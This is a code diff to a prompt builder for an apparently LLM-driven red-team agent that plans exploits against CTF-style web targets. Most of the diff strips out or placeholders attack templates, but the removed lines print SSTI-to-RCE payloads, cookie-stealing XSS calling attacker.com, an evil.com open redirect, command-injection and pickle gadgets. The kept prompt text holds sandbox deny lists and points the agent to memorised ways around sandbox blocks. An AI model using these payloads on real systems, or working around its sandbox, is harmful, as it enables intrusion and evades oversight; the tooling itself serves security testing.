@@ -12,7 +12,6 @@ from core.challenge_adapter import ChallengeAdapter, get_adapter
 from core.llm_client import DeepSeekClient, SchemaValidationError
 from core.memory_store import LayeredMemory
 from core.settings import Settings
-from core.template_manager import TemplateManager, TemplateSelectionResult
 from memory.exploit_trajectory import ExploitTrajectoryMemory, get_trajectory
 from memory.verification_memory import VerificationMemory, get_verification
 from memory.exploit_primitives import get_primitive_registry
@@ -142,7 +141,7 @@ _VELOCITY_KNOWN_LESSONS: dict[str, str] = {
         "Velocity 模板引擎在解析 #set/#macro/#evaluate 指令时，"
         "单引号包裹的字符串字面量（如 '$x.class'）可能导致解析器失效。"
         "强烈建议优先使用双引号（\"$x.class\"）、无引号语法（$x.class）或 URL 编码的引号（%22）。"
-        "示例：#set($rt=$x.class.forName(\"java.lang.Runtime\")) — 使用双引号包裹类名字符串。"
+        "示例：TEMPLATE_DIRECTIVE($rt=$x.class.forName(\"java.lang.Runtime\")) — 使用双引号包裹类名字符串。"
     ),
     "velocity_reflection_block": (
         "Velocity 的 UberspectImpl / SecureUberspector 默认限制了对 java.lang.Class 和 "
@@ -152,7 +151,7 @@ _VELOCITY_KNOWN_LESSONS: dict[str, str] = {
     ),
     "url_encoding_hash": (
         "在 GET 参数中传递 Velocity 指令时，# 字符必须进行 URL 编码为 %23。"
-        "例如：?text=%23set($x%3D7*7)$x 而非 ?text=#set($x=7*7)$x。"
+        "例如：?text=%23set($x%3DARITHMETIC_PROBE)$x 而非 ?text=TEMPLATE_DIRECTIVE($x=ARITHMETIC_PROBE)$x。"
         "否则 HTTP 框架会将 # 之后的内容视为 URL fragment，导致指令不完整。"
     ),
     "in_band_mandatory": (
@@ -183,7 +182,7 @@ def _build_high_priority_lessons(
                 "排查顺序：1) #是否做了URL编码(%23) 2) 参数名是否正确 3) GET还是POST"
             ),
             "template_eval_only": (
-                "模板引擎确认可解析算术表达式（如 7*7=49），但反射链被阻塞。"
+                "模板引擎确认可解析算术表达式（如 ARITHMETIC_PROBE=49），但反射链被阻塞。"
                 "建议不要再反复尝试 getClass/forName/Runtime 链，改为尝试 #evaluate() 指令或 #macro 滥用。"
             ),
             "reflection_only": (
@@ -324,7 +323,7 @@ def _build_hard_constraints_block() -> str:
     return (
         "HARD CONSTRAINTS (绝对禁令)\n"
         "  ❌ import os, subprocess, socket, pickle, ctypes, requests, urllib3\n"
-        "  ❌ os.system() / subprocess.run() / __import__() — 文本也被拦截\n"
+        "  ❌ OS command API() / subprocess API() / __import__() — 文本也被拦截\n"
         "  ❌ shell 禁止 bash/sh/zsh；❌ curl|sh, wget|sh\n"
         "  ❌ 单行分号串联 (SyntaxError)\n"
         "  ✅ import: json, re, base64, hashlib, hmac, struct, urllib.parse, http.cookies\n"
@@ -615,7 +614,7 @@ _COMMON_RULES = """╔═══════════════════�
   ❌ import os, subprocess, socket, pickle, ctypes, cffi, importlib, builtins
   ❌ gc, inspect, ast, code, codeop, dis, types, marshal, pty, multiprocessing, signal, weakref
   ❌ __import__('os') / compile() / execfile() — 运行时也会被正则拦截，别试绕过！
-  ❌ os.system() / os.popen() / subprocess.run() — 任何形式的命令执行都会被拦截
+  ❌ OS command API() / os.popen() / subprocess API() — 任何形式的命令执行都会被拦截
   ❌ shell 步骤禁止 bash/sh/zsh — 只允许 curl, wget, python3 等白名单工具
   ❌ import requests, urllib3, httpx, http — 原生通信库全部被禁！唯一合法网络通道: redteam_sdk.HttpClient
   ✅ import urllib.parse — URL 编码已放行，SSTI/编码利用必备！禁止 import urllib.request（原生通信）！
@@ -641,7 +640,7 @@ _COMMON_RULES = """╔═══════════════════�
        print(f'HTTP {resp.status_code}: {resp.text[:500]}')
    except Exception as e: print(f'[ERR] {e}')
 5. 禁止 pipe 到 sh/bash，禁止编造 URL 路径，禁止手写正则解析 HTML/JSON/JWT
-6. ⚠️ Validator 只检查 import 语句，Executor 会额外对代码文本做正则拦截（os.system/subprocess 字面量也会被拦）"
+6. ⚠️ Validator 只检查 import 语句，Executor 会额外对代码文本做正则拦截（OS command API/subprocess 字面量也会被拦）"
 7. 遇到沙箱拦截 → 查看下方"🛡️ 沙箱冲突规避"记忆区获取正确绕过手法（不从这里找答案）
 
 ═══════════════ SDK 速查表 (redteam_sdk) ═══════════════
@@ -877,259 +876,6 @@ def _build_evidence_extracts(vulns: list[dict[str, Any]]) -> str:
     return "\n\n".join(parts)
 
 
-def _build_cwe_templates_generic(cwe_set: set[str]) -> str:
-    templates = []
-
-    if "CWE-94" in cwe_set or "CWE-917" in cwe_set:
-        templates.append("""
-【SSTI/模板注入攻击模板（CWE-94/CWE-917）— 通用版】：
-常见触发点：邮件渲染、页面模板、PDF生成、日志记录
-常见框架：Jinja2 (Flask/Django), Twig (PHP), ERB (Ruby), Freemarker (Java), Velocity (Java)
-
-基础探测payload（验证SSTI是否存在）：
-{{7*7}}  → 期望输出 49
-${7*7}   → 期望输出 49（Freemarker）
-#{7*7}   → 期望输出 49（Thymeleaf）
-
-Jinja2 SSTI→RCE payload示例（根据实际注入点调整参数名）：
-import requests,urllib3,json; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
-payload="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
-r=requests.post(f'{base}{INJECTION_ENDPOINT}', data={'EMAIL_FIELD':payload+'@x.com','OTHER_FIELDS':'values'}, verify={VERIFY_FLAG})
-print('###CHAIN_OUTPUT###'+json.dumps({'status':r.status_code,'body':r.text[:300]}))
-
-注意：
-- SSTI执行结果通常不会直接返回给攻击者！需要配合其他漏洞（如XSS、文件写入、外带DNS）获取结果
-- 根据证据中的 attack_chain 确认具体的注入点和触发路径
-- 如果目标有邮件发送功能，SSTI可能在邮件渲染时触发
-
-═══════════════ ★ SSTI 渐进验证强制规则（Progressive Verification）★ ═══════════════
-【🔴 这是硬约束！检测到 SSTI 时必须按以下顺序逐步验证，每步确认成功后才能进入下一步，禁止跳级！】
-
-Step 1 — 算术验证（已知成功则跳过）：
-  Jinja2:   {{7*7}} → 期望返回 49
-  Velocity:  #set($x=7*7)$x → 期望返回 49
-  Freemarker: ${7*7} → 期望返回 49
-  print() 验证：resp.text 中是否包含 "49"
-
-Step 2 — 对象访问验证：
-  Jinja2:   {{config}} 或 {{self}} → 期望返回非空对象引用
-  Velocity:  $class → 期望返回非空对象引用
-  判断标准：resp.text 不为空且不是纯数字
-
-Step 3 — 方法调用验证：
-  Jinja2:   {{config.__class__}} → 期望返回类名
-  Velocity:  $class.getName() → 期望返回类名字符串
-  判断标准：resp.text 中存在类名/类型字符串
-
-Step 4 — ClassLoader 验证（Java框架）：
-  Velocity:  $class.getClassLoader() → 期望返回非空
-  判断标准：resp.text 不为空
-
-Step 5 — Runtime 获取：
-  Jinja2:   {{config.__class__.__init__.__globals__['os']}}
-  Velocity:  $class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null)
-  判断标准：resp.text 中包含 Runtime 对象信息
-
-Step 6 — 命令执行验证（用无害命令）：
-  执行 id 或 whoami，确认有回显再读 flag
-  Jinja2:   popen('id').read() 或 popen('whoami').read()
-  Velocity:  Runtime.getRuntime().exec("id")
-  print() 验证：resp.text 或 stdout 中是否有 uid= / username=
-
-Step 7 — flag 读取：
-  确认命令执行有回显后：cat /flag 或 find / -name flag* 2>/dev/null
-  print() 验证：是否读取到 flag 内容
-
-【🔴 逐级检查规则】：
-  1. 每个 step 只能推进一级（Step N→Step N+1），禁止跨级跳步
-  2. 当前级未通过 → 下一轮必须重试同级的变异 payload，禁止跳到下一级
-  3. 每轮 Planner 必须在 step 的 purpose 字段中声明目标 Step 级别
-  4. 每步末尾必须 print(f"[SSTI_STAGE] Stage=N result={{resp.text[:300]}}")
-  5. Evaluator 会检查 [SSTI_STAGE] 标记判定是否允许推进
-  6. 已知成功的 Step 可以在本轮跳过，从第一个未确认的 Step 开始
-
-Velocity SSTI 特别说明：
-- Velocity 模板执行结果会直接反射在 HTTP 响应体中
-- 不需要 OOBReceiver 做带外回调
-- 验证命令执行时，直接检查响应体是否包含命令输出
-- 例如执行 id 命令，响应体里应出现 uid= 字样
-- 例如读取 /flag，响应体里应直接出现 flag 内容
-- 禁止在 Velocity SSTI 利用链中使用 OOBReceiver
-""")
-
-    if "CWE-79" in cwe_set:
-        templates.append("""
-【XSS/CSS注入攻击模板（CWE-79）— 通用版】：
-分类与利用场景：
-
-1. 存储型XSS（持久化）：
-   - 用户资料、评论、商品描述等存储后由其他用户/管理员查看的字段
-   - Payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
-   - 或 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
-
-2. CSS注入（属性选择器数据外带）：
-   - 当页面包含敏感值在HTML元素中时（如<input value="SECRET">）
-   - 利用CSS属性选择器逐字符泄露：
-     input[value^="a"] { background:url(https://attacker.com/char?a) }
-     input[value^="ab"] { background:url(https://attacker.com/prefix?ab) }
-   - 匹配成功时浏览器自动发起请求，逐字符泄露token/secret
-
-3. DOM-based XSS：
-   - 危险函数：innerHTML, document.write(), eval(), setTimeout(), location.hash
-   - 寻找未过滤的用户输入直接插入DOM的位置
-
-4. Service Worker注入：
-   - 如果应用注册了SW且SW源可控制，可劫持所有网络请求
-   - 注入恶意SW后可拦截/修改请求、窃取cookie
-
-通用利用流程：
-Step 1 - 注入payload到可存储字段
-Step 2 - 触发管理员/Bot访问含payload的页面（report功能、分享链接等）
-Step 3 - 在attacker服务器接收窃取的数据（cookie/token/session）
-Step 4 - 用窃取的凭证进行权限提升操作
-""")
-
-    if "CWE-352" in cwe_set:
-        templates.append("""
-【CSRF保护绕过策略（CWE-352）— 通用版】：
-常见CSRF保护机制及绕过方法：
-
-1. Token验证（Referer/Origin检查）：
-   - 绕过：如果token可通过XSS/CSS注入获取，则可构造完整CSRF请求
-   - 绕过：如果token验证不严格（接受空值、任意值）
-
-2. SameSite Cookie：
-   - Strict: 完全阻止跨站（最难绕过）
-   - Lax: GET请求可跨站（可结合开放重定向）
-   - None: 无保护（需Secure标志+HTTPS）
-
-3. JWT中的CSRF token：
-   - 如果JWT存储在非HttpOnly cookie中，JS可读取
-   - 通过XSS/CSS提取JWT内的CSRF token
-   - 用提取的token构造合法请求
-
-通用绕过思路：
-A - 先通过其他漏洞（XSS/CSS注入）获取CSRF token
-B - 分析token生成逻辑，尝试预测/伪造
-C - 寻找无需token的API端点（遗漏）
-D - 如果是双token机制（cookie+header），尝试只满足其中一个
-""")
-
-    if "CWE-362" in cwe_set:
-        templates.append("""
-【竞态条件利用策略（CWE-362）— 通用版】：
-典型场景：
-- 文件上传：TOCTOU（Time of Check to Time of Use）竞争
-- 权限变更：先检查后更新的非原子操作
-- 资源分配：并发请求抢夺同一资源
-- 状态转换：支付/审批等多状态系统的状态竞争
-
-通用利用框架（Python threading）：
-import requests,urllib3,json,threading,time; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
-s=requests.Session(); s.verify={VERIFY_FLAG}
-results=[]; errors=[]
-def race_request(payload_data, label):
-    try: r=s.post(f'{base}{RACE_ENDPOINT}', data=payload_data, cookies=s.cookies); results.append((label,r.status_code,r.text[:200]))
-    except Exception as e: errors.append(str(e))
-threads=[threading.Thread(target=race_request, args=(data1,'req1')), thread.Thread(target=race_request, args=(data2,'req2'))]
-[t.start() for t in threads]; [t.join() for t in threads]
-print('###CHAIN_OUTPUT###'+json.dumps({'results':results,'errors':errors}))
-
-关键要点：
-- 并发线程数通常10-50个，取决于TOCTOU窗口大小
-- 两个请求的参数必须有冲突（一个合法一个越权）
-- 需要多次循环尝试（竞态窗口可能只有毫秒级）
-- 成功标志：返回结果中出现越权操作的痕迹
-""")
-
-    if "CWE-434" in cwe_set:
-        templates.append("""
-【文件上传漏洞利用（CWE-434）— 通用版】：
-常见攻击向量：
-
-1. 路径遍历（../../../）：
-   - filename参数注入 ../ 写入任意位置
-   - 目标：webshell (.php/.jsp/.asp)、配置文件覆盖、cron job
-
-2. 文件类型伪造：
-   - Magic bytes伪造：%PDF- (PDF), GIF89a (GIF), PK\\x03\\x04 (ZIP)
-   - 双扩展名：shell.php.jpg (配合Apache解析漏洞)
-   - Null字节截断：shell.php%00.jpg (旧版本)
-
-3. 元数据/头信息注入：
-   - ExifTool处理的JPEG/PDF可注入命令
-   - SVG文件内嵌JavaScript
-   - Office宏（.docm/.xlsm）
-
-4. 存储型XSS via文件名：
-   - 文件名反射到HTML时未转义
-
-通用测试流程：
-Step 1 - 上传正常文件确认功能可用
-Step 2 - 尝试magic bytes伪造（%PDF-开头+恶意内容）
-Step 3 - 尝试路径遍历（filename=../../evil.php）
-Step 4 - 尝试元数据注入（如果有ExifTool/ImageMagick处理）
-Step 5 - 如果有解析/预览功能，尝试对应格式的RCE
-""")
-
-    if "CWE-601" in cwe_set:
-        templates.append("""
-【开放重定向利用（CWE-601）— 通用版】：
-测试方法：修改url/redirect/next/target/callback参数为外部域名
-import requests,urllib3; urllib3.disable_warnings(); base='{TARGET_BASE_URL}'
-r=requests.get(f'{base}{REDIRECT_ENDPOINT}?url=https://evil.com', allow_redirects=False, verify={VERIFY_FLAG})
-print('###CHAIN_OUTPUT###'+str({'status':r.status_code,'location':r.headers.get('Location')}))
-利用场景：钓鱼攻击、窃取OAuth token、绕过referer检查
-""")
-
-    if "CWE-89" in cwe_set:
-        templates.append("""
-【SQL注入攻击模板（CWE-89）— 通用版】：
-快速验证：' OR '1'='1' -- / " OR "1"="1
-自动化工具：sqlmap -u "URL" --batch --level=2 --risk=2 [--force-ssl]
-手动注入流程：
-1. 确定注入点（参数/Headers/Cookie）
-2. 判断数据库类型（报错差异/注释符/内置函数）
-3. 确定字段数（ORDER BY 1,2,3...）
-4. 获取数据库名/表名/列名
-5. 提取敏感数据（credentials/flags）
-""")
-
-    if "CWE-78" in cwe_set:
-        templates.append("""
-【命令注入策略（CWE-78）— 通用版】：
-分隔符：; & && | || $() ` \\n %0a %0d
-测试payload：;whoami / $(whoami) / `whoami` / | whoami
-盲注技巧：sleep 5 / ping -c 5 attacker.com（时间侧信道）
-""")
-
-    if "CWE-502" in cwe_set:
-        templates.append("""
-【反序列化攻击模板（CWE-502）— 通用版】：
-Pickle (Python)：pickle.dumps((os.system,('cmd',)))
-Java: ysoserial生成gadget链
-PHP: unserialize() + POP chain
-注意：反序列化通常需要知道目标使用的库版本以构造正确的gadget链
-""")
-
-    if "CWE-918" in cwe_set:
-        templates.append("""
-【SSRF攻击策略（CWE-918）— 通用版】：
-⚠️ 以下为 SSRF 注入载荷（注入到目标请求参数中，由目标服务器代发），不是你自己脚本的连接目标！
-内网探测：127.0.0.1:6379(Redis), localhost:3306(MySQL), localhost:8080
-云元数据：169.254.169.254(AWS/GCP/Azure)
-绕过WAF：十进制IP(2130706433=127.0.0.1)、短URL重定向、DNS rebinding
-🔴 你自己的脚本始终使用 target_base 动态变量连接目标，禁止硬编码 localhost/127.0.0.1！
-""")
-
-    if templates:
-        return "\n".join([
-            "【CWE专项攻击模板 — 通用版】（以下模板适用于各类CTF/Web安全题目，请根据实际目标调整{TARGET_BASE_URL}和{INJECTION_ENDPOINT}等占位符）：",
-            *templates,
-        ])
-    return ""
-
-
 _NO_AVAILABLE_STRATEGY_BLOCK = """[NO_AVAILABLE_STRATEGY_FOR_SURFACE]
 All known strategies for the current surface are empirically rejected.
 Do not generate same-family payloads.
@@ -1140,224 +886,41 @@ No YAML strategy matched the current surface. Generic CWE bootstrap execution is
 Create a reviewed migration/suggestion task instead of emitting payload code."""
 
 
-def _select_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any], state: str = "") -> TemplateSelectionResult:
-    mgr = TemplateManager()
-    strategy_health_resolver = None
-    try:
-        from control.hypothesis_tracker import get_hypothesis_tracker
-        tracker = get_hypothesis_tracker()
-        rejected = tracker.get_rejected_strategy_ids()
-        strategy_health_resolver = lambda sid: tracker.evaluate_strategy_health(sid).to_dict()
-    except Exception:
-        rejected = set()
-
-    selection = mgr.select_templates_for_target(
-        confirmed,
-        state=state,
-        rejected_strategy_ids=rejected,
-        strategy_health_resolver=strategy_health_resolver,
-    )
-    if selection.status == "AVAILABLE_STRATEGY":
-        return selection
-    if selection.status == "ALL_MATCHED_STRATEGIES_REJECTED":
-        selection.text = _NO_AVAILABLE_STRATEGY_BLOCK
-        return selection
-
-    selection.text = _UNVERIFIED_BOOTSTRAP_BLOCK
-    return selection
-
-
-def _build_cwe_templates(vulns: list[dict[str, Any]], confirmed: dict[str, Any], state: str = "") -> str:
-    return _select_cwe_templates(vulns, confirmed, state=state).text
-
-# Task 2 — 硬核目标摘要提取器 (User Goal Truncation)
-# 原始文本超过 _USER_GOAL_SOFT_LIMIT 时执行硬性正则提取，
-# 仅保留核心三要素：端点、已知参数变量、沙箱边界规约。
-# 其余叙述性散文、冗余说明在移交给 Planner 前物理剔除。
-# ═══════════════════════════════════════════════════════════════════
-
-_USER_GOAL_SOFT_LIMIT = 2500
-
-
-def _build_cwe_aware_json_example(
+def _build_safe_json_shape_example(
     vulns: list[dict[str, Any]],
     injection_points: list[str],
     target_base: str,
     template_selection_status: str = "",
 ) -> str:
-    """构建与当前 CWE 对齐的 JSON 输出示例，避免模型猜错格式。
-
-    根据 CWE 类型选择不同的 payload 示例：
-      - CWE-94 / SSTI / Template Injection → Velocity #set() payload
-      - CWE-78 / CWE-77 / Command Injection → ; id payload
-      - 其他 → 通用 HTTP 探测
-    """
-    # 提取 CWE 集合
-    cwe_set: set[str] = set()
-    for v in vulns:
-        cwe = v.get("cwe_id", "").upper()
-        if cwe:
-            cwe_set.add(cwe)
-        # 也检查 title 中的关键词
-        title = (v.get("title") or "").lower()
-        if "ssti" in title or "template" in title or "velocity" in title:
-            cwe_set.add("CWE-94")
-
-    # 提取第一个注入参数名
-    param_name = "param"
-    if injection_points:
-        import re
-        m = re.search(r'参数名:\s*(\w+)', injection_points[0])
-        if m:
-            param_name = m.group(1)
-
-    if template_selection_status == "ALL_MATCHED_STRATEGIES_REJECTED":
-        return f"""【JSON输出格式 — 必须严格遵守以下示例结构】
-
-[NO_AVAILABLE_STRATEGY_FOR_SURFACE]
-All known strategies for the current surface are empirically rejected.
-Do not generate same-family payloads or concrete payload variants for this CWE.
-Request a new strategy or switch surface.
+    """Return a harmless JSON shape example only; never include attack payloads."""
+    status_note = template_selection_status or "AVAILABLE_STRATEGY"
+    return f"""[JSON_OUTPUT_SHAPE_ONLY]
+This is a schema example, not an exploit recipe. Do not copy payloads from examples.
+Current template selection status: {status_note}
 
 {{
   "version": 1,
   "plan_id": "PLAN-001",
-  "vuln_summary": "Current surface has no available known strategy",
-  "rationale": "All matched YAML strategies for this surface are rejected; do not revive same-family payloads.",
-  "attack_chain": "Request a new strategy or switch to a different surface",
+  "selected_canonical_strategy_id": "<choose one trusted allowed canonical strategy id>",
+  "trusted_run_id": "<trusted run id>",
+  "trusted_round": 0,
+  "trusted_selection_hash": "<trusted selection hash>",
+  "vuln_summary": "Summarize the confirmed surface without inventing payloads",
+  "rationale": "Explain why the selected canonical strategy is appropriate",
+  "chain_design": "Use trusted strategy identity and confirmed surface metadata",
   "steps": [
     {{
       "id": "step-1",
       "type": "python",
-      "purpose": "Do not execute rejected same-family payloads; propose a new strategy family instead.",
-      "command": "print('NO_AVAILABLE_STRATEGY_FOR_SURFACE')",
-      "expected_outcome": "Planner must switch strategy or surface",
-      "primitive": "strategy_switch",
-      "why_this_primitive": "Known strategies for parameter {param_name} are empirically rejected"
+      "purpose": "Harmless schema placeholder",
+      "command": "print('STEP_OK')",
+      "expected_outcome": "STEP_OK",
+      "primitive": "schema_placeholder",
+      "why_this_primitive": "Demonstrates structure only"
     }}
   ]
 }}
 """
-    # 根据 CWE 选择 payload 和描述
-    is_ssti = any(c in cwe_set for c in ("CWE-94", "CWE-917", "CWE-1336"))
-    is_cmd_inj = any(c in cwe_set for c in ("CWE-77", "CWE-78"))
-
-    if is_ssti:
-        vuln_type = "SSTI/模板注入漏洞"
-        summary = "Apache Velocity SSTI，可通过模板语法执行任意Java代码"
-        rationale = "利用Velocity #set()指令逐步获取Runtime对象并执行系统命令"
-        chain = "Step1: SSTI探测(算术表达式) → Step2: 反射获取Runtime → Step3: 执行命令读flag"
-        purpose = "通过Velocity SSTI注入算术表达式 #set($x=7*7)$x 确认模板引擎解析"
-        outcome = "响应中包含 49，确认SSTI漏洞存在"
-        primitive = "template_injection"
-        why_primitive = "模板注入是获取RCE的唯一入口"
-        # Velocity SSTI 探测 payload — 多行 Python 包装
-        command = (
-            f"import json, urllib.parse\\n"
-            f"from redteam_sdk import HttpClient\\n\\n"
-            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
-            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
-            f"s = HttpClient(target_base)\\n\\n"
-            f"payload = '#set($x=7*7)$x'\\n"
-            f"encoded = urllib.parse.quote(payload)\\n"
-            f"resp = s.get(f'/?{param_name}={{encoded}}')\\n"
-            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
-            f"print('STEP_OK')"
-        )
-    elif is_cmd_inj:
-        vuln_type = "命令注入漏洞"
-        summary = "命令注入漏洞，可通过参数拼接系统命令"
-        rationale = "选择 command 注入链，因为目标参数直接拼接 shell 命令"
-        chain = "Step1: 信息探测 → Step2: 命令注入读取flag"
-        purpose = "通过命令注入执行 id 命令确认漏洞存在"
-        outcome = "响应中包含 uid= 字样，确认命令执行成功"
-        primitive = "command_injection"
-        why_primitive = "命令注入是获取 RCE 的唯一入口"
-        command = (
-            f"import json, urllib.parse\\n"
-            f"from redteam_sdk import HttpClient\\n\\n"
-            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
-            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
-            f"s = HttpClient(target_base)\\n\\n"
-            f"payload = '; id'\\n"
-            f"encoded = urllib.parse.quote(payload)\\n"
-            f"resp = s.get(f'/?{param_name}={{encoded}}')\\n"
-            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
-            f"print('STEP_OK')"
-        )
-    else:
-        vuln_type = "Web漏洞"
-        summary = "目标存在可利用漏洞"
-        rationale = "先进行信息探测，确认目标响应特征后再构造精确攻击载荷"
-        chain = "Step1: 信息探测 → Step2: 漏洞利用"
-        purpose = "发送探测请求确认目标可达性和响应特征"
-        outcome = "HTTP 200，确认目标可达"
-        primitive = "information_disclosure"
-        why_primitive = "信息探测是攻击链的起点"
-        command = (
-            f"import json\\n"
-            f"from redteam_sdk import HttpClient\\n\\n"
-            f"with open('/workspace/context.json') as f: ctx = json.load(f)\\n"
-            f"target_base = ctx.get('target_context', {{}}).get('base_url', '')\\n"
-            f"s = HttpClient(target_base)\\n\\n"
-            f"resp = s.get('/')\\n"
-            f"print(f'HTTP {{resp.status_code}}: {{resp.text[:500]}}')\\n"
-            f"print('STEP_OK')"
-        )
-
-    return f"""【JSON输出格式 — 必须严格遵守以下示例结构】
-
-你必须输出一个扁平的 JSON 对象。🔴 steps 必须是顶层字段，禁止包裹在 plan 或 attack_plan 里面！
-每 step 的 command 字段必须包含完整的 Python 多行代码（禁止单行分号串联），末尾必须有 print('STEP_OK')。
-
-===== 标准输出示例（直接拷贝此结构，替换内容）=====
-
-{{
-  "version": 1,
-  "plan_id": "PLAN-001",
-  "vuln_summary": "{summary}",
-  "rationale": "{rationale}",
-  "chain_design": "{chain}",
-  "steps": [
-    {{
-      "id": "step-1",
-      "status": "PLANNED",
-      "type": "python",
-      "purpose": "{purpose}",
-      "expected_outcome": "{outcome}",
-      "depends_on": [],
-      "on_failure": "BLOCK_AND_DEBUG",
-      "why_this_step_advances_state": "确认漏洞存在并建立初始原语",
-      "why_this_payload_is_a_mutation": "首次探测，使用最小化载荷",
-      "why_this_is_not_regression": "第一轮无历史回归风险",
-      "target_primitive": "{primitive}",
-      "why_this_primitive_advances_chain": "{why_primitive}",
-      "command": "{command}"
-    }}
-  ],
-  "history_state": {{
-    "tried_payloads": [],
-    "failed_reasons": [],
-    "consecutive_failures_per_category": {{}},
-    "forced_path_switch": ""
-  }},
-  "primitive_context": {{
-    "current_primitive": null,
-    "target_primitive": "{primitive}",
-    "transition_edge": "",
-    "fallback_primitive": ""
-  }}
-}}
-
-===== 关键规则 =====
-✅ 每 step 必须包含 command 字段，值为完整多行 Python 代码
-✅ command 代码末尾必须打印 print('STEP_OK')
-✅ HTTP 请求必须使用 redteam_sdk.HttpClient，禁止 import requests
-✅ 禁止单行分号串联（如 a=1; b=2 会被拦截）
-❌ 禁止输出 type="http" 或 method/path/params 字段（此格式已废弃）
-❌ 禁止输出 imports 或 sdk_calls 数组（已废弃）
-❌ 禁止在 command 中使用 import os/subprocess/socket（会被拦截）
-❌ 禁止输出纯字符串 command（必须是可执行的 Python 代码）"""
 
 
 def _extract_injection_point(vuln: dict[str, Any], evidence_list: list[dict]) -> dict[str, str]:
@@ -1428,7 +991,7 @@ def _extract_injection_point(vuln: dict[str, Any], evidence_list: list[dict]) ->
     return {}
 
 
-def _extract_user_goal_dense(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None, state: str = "") -> str:
+def _extract_user_goal_dense(confirmed: dict[str, Any], adapter: ChallengeAdapter | None = None, trusted_selection: dict[str, Any] | None = None) -> str:
     """Build a high-density, minimal User Goal block from confirmed_vuln data.
 
     Only extracts: base_url, endpoints (top 20), CWE IDs + titles,
@@ -1515,21 +1078,16 @@ def _extract_user_goal_dense(confirmed: dict[str, Any], adapter: ChallengeAdapte
         challenge_rules = adapter.extra_rules()
 
     # ── JSON 输出格式要求（动态匹配当前 CWE，防止模型猜错）──
-    template_selection = _select_cwe_templates(vulns, confirmed, state=state)
-    _json_example = _build_cwe_aware_json_example(
+    trusted_status = (trusted_selection or {}).get("status", "")
+    _json_example = _build_safe_json_shape_example(
         vulns,
         injection_points,
         target_base,
-        template_selection_status=template_selection.status,
+        template_selection_status=trusted_status,
     )
     parts.append(_json_example)
 
     core = "\n\n".join(parts)
-
-    # ── 追加 CWE 模板和公共规则（但限制体积）──
-    cwe_templates = template_selection.text
-    if cwe_templates:
-        core += f"\n\n【CWE模板】\n{_physical_truncate(cwe_templates, 600)}"
 
     if challenge_rules:
         core += f"\n{challenge_rules[:500]}"
@@ -1578,8 +1136,7 @@ def build_dynamic_prompt(confirmed: dict[str, Any], adapter: ChallengeAdapter | 
 
     vuln_table = _build_vuln_table(vulns)
     evidence_extracts = _build_evidence_extracts(vulns)
-    template_selection = _select_cwe_templates(vulns, confirmed, state=state)
-    cwe_templates = template_selection.text
+    cwe_templates = ""
     os_context = _get_os_context()
 
     bp_info = ""
@@ -1698,7 +1255,7 @@ PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错�
      → 例如："验证 object_access: 通过 $class 访问 Java Class 对象"
 
   ❌ 严禁：
-  - 看到 7*7=49 → 直接尝试 Runtime.getRuntime().exec("cat /flag")
+  - 看到 ARITHMETIC_PROBE=49 → 直接尝试 runtime execution API("cat /flag")
   - 一轮中包含跨多个 capability 的 payload
   - 跳过上游未验证的能力直接写 RCE payload
 
@@ -1732,12 +1289,12 @@ PLANNED→IN_PROGRESS→DONE(exit_code=0)|BLOCKED(exit_code≠0)→追加排错�
 【Payload 演化规则 — 严禁随机生成！必须基于历史变异！】
 
   1. 从成功 payload 变异（沿结构梯度升级）:
-     `{{{{ 7 * 7 }}}}` -> `{{{{ config }}}}` -> `{{{{ self.__init__.__globals__ }}}}` -> RCE chain
+     `{{{{ ARITHMETIC_PROBE }}}}` -> `{{{{ config }}}}` -> `{{{{ self.__init__.__globals__ }}}}` -> RCE chain
      保留已确认可达的模板结构，只升级内部执行原语
 
   2. 从失败 payload 变异（跨格式/编码尝试）:
-     失败: `{{{{ 7 * 7 }}}}`
-     变异方向: $`{{{{ 7 * 7 }}}}`、#`{{{{ 7 * 7 }}}}`、< % 7*7 % >、%7B%7B7*7%7D%7D
+     失败: `{{{{ ARITHMETIC_PROBE }}}}`
+     变异方向: $`{{{{ ARITHMETIC_PROBE }}}}`、#`{{{{ ARITHMETIC_PROBE }}}}`、< % ARITHMETIC_PROBE % >、%7B%7BARITHMETIC_PROBE%7D%7D
      保留语义，变换语法格式或编码方式
 
   3. 禁止破坏已确认的结构:
@@ -1775,7 +1332,7 @@ _CWE_INFERENCE_TABLE: list[tuple[tuple[str, ...], str, str]] = [
     (("xxe", "xml external entity"), "xxe", "CWE-611"),
     (("jwt", "jwt alg:none", "jku", "jwk injection"), "jwt_attack", "CWE-347"),
     (("ssti", "jinja2", "freemarker", "thymeleaf", "velocity", "template injection"), "ssti", "CWE-1336"),
-    (("command injection", "os.system", "shell_exec", "exec(", "cmd injection"), "command_injection", "CWE-78"),
+    (("command injection", "OS command API", "shell_exec", "exec(", "cmd injection"), "command_injection", "CWE-78"),
     # ── cwe_id=UNKNOWN 时的兜底关键词匹配 ──
     (("missing authentication", "no authentication", "unauthenticated"), "missing_auth", "CWE-306"),
     (("missing authorization", "no authorization", "idor"), "missing_authz", "CWE-862"),
@@ -2087,7 +1644,7 @@ def _build_memory_context(
                     blocks.append("🔴 强制注入：pickle 沙箱安全手法（必须遵守！）")
                     blocks.append("═" * 72)
                     blocks.append("❌ 绝对禁止在代码中写 import pickle / import os / import subprocess")
-                    blocks.append("❌ 绝对禁止代码文本出现 os.system( / os.popen( / subprocess.run( / __import__(")
+                    blocks.append("❌ 绝对禁止代码文本出现 OS command API( / os.popen( / subprocess API( / __import__(")
                     blocks.append("✅ 必须使用以下经过验证的 bytes 硬编码手法，直接复制使用：")
                     blocks.append("")
                     for i, tpl in enumerate(matched):
@@ -2198,7 +1755,7 @@ def _build_forbidden_techniques_block(feedback: dict[str, Any]) -> str:
